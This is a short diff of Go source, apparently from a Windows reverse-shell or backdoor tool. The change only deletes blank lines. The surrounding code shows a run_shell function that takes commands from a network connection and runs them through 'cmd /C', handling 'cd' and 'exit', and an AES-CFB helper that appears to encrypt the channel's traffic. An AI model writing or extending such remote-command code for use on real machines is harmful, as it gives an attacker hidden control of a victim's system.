@@ -41,11 +41,9 @@ func run_shell(conn net.Conn) {
         if strings.Index(command, "exit") == 0 {
             conn.Close()
             os.Exit(0) 
-
         } else if strings.Index(command, "cd") == 0 {
             dir := strings.TrimSuffix(command[3:], "\r\n")
             os.Chdir(string(dir))
-
         } else {
             shell_arg := []string{"/C", command}
             execcmd := exec.Command("cmd", shell_arg...)
@@ -67,7 +65,6 @@ func encryption(encrypt bool, key []byte, message string) (result string) {
         stream := cipher.NewCFBEncrypter(block, iv)
         stream.XORKeyStream(cipherText[aes.BlockSize:], plainText)
         result = base64.URLEncoding.EncodeToString(cipherText)
-
     } else {
         cipherText, _ := base64.URLEncoding.DecodeString(message)
         block, _ := aes.NewCipher(key)
